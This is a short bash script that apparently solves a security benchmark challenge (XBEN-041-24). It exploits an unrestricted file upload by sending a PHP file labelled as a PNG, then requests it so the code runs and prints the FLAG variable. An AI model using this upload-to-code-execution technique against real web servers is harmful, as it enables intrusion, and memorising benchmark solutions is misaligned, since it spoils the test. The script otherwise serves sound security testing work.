#!/usr/bin/env bash
# XBEN-041-24 — unrestricted file upload to RCE. Proxy-mode twin. The uploader
# trusts a PNG content-type while saving a .php name, so a PHP file lands under
# /upload and executes when fetched. The payload prints the FLAG env var.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
NAME="probe$$.php"
SESSION="xben041p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/index.php"
BASE="$(req_of GET index.php)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/index.php' \
  --set 'multipart.userfile=<?php echo getenv("FLAG"); ?>' \
  --set "multipart.userfile.filename=$NAME" \
  --set 'multipart.userfile.content_type=image/png' \
  --set 'multipart.submit=Upload Image' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" --set "path=/upload/$NAME" >/dev/null
print_flag
